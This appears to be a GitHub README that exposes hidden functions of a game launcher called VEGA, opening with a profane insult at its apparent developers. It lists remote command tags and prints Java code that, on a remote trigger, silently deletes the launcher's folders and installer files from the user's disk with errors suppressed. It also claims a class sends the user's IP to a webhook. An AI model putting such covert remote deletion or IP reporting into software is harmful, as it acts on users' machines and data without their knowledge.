**fuck djuniks**

![VEGA Screenshot](https://github.com/burgerhack16/vega-065/blob/master/image.png?raw=true)

## CLAUNCH TAGS))))
CLaunch.java:
- check hwid
- block cheat func
- etc

## Commands / Tags

| `#ban#`
| `#banlt#`
| `#freak#`
| `#clear#`
| `#adm#`
| `#noupds#`
| `#lockMod-`
| `#dMK-`

## delete vega on ur pc

```java
if (this.delCL()) {
    try {
        String usersPath = FileUtils.getUserDirectory().getAbsolutePath();
        
        String[] pathsToDelete = {
            usersPath + "\\AppData\\Local\\gamepath",
            usersPath + "\\AppData\\Roaming\\VEGA.NCO",
            usersPath + "\\Desktop\\VL.lnk",
            usersPath + "\\Downloads\\VL057M_Installer.exe",
            usersPath + "\\Downloads\\VL058M_Installer.exe",
            usersPath + "\\Downloads\\VL059B_Installer.exe",
            usersPath + "\\Downloads\\VL060M_Installer.exe",
            usersPath + "\\Downloads\\VL061M_Installer.exe",
            usersPath + "\\Downloads\\VL062M_Installer.exe",
            usersPath + "\\Downloads\\VL063M_Installer.exe",
            usersPath + "\\Downloads\\VL064M_Installer.exe",
            usersPath + "\\Downloads\\VL065M_Installer.exe",
            usersPath + "\\Downloads\\VL066M_Installer.exe",
            usersPath + "\\Downloads\\VL067M_Installer.exe",
            usersPath + "\\Downloads\\VL068M_Installer.exe"
        };

        for (String deletePath : pathsToDelete) {
            File file = new File(deletePath);
            if (file == null) continue;

            if (file.isDirectory()) {
                for (File subFile : file.listFiles()) {
                    if (subFile != null) {
                        if (!subFile.delete()) {
                            subFile.deleteOnExit();
                        }
                    }
                }
            }
            
            if (!file.delete()) {
                file.deleteOnExit();
            }
        }
    } catch (Exception ignored) {
        // silent fail
    }
}
```

## and EG.class webhook send ur ip
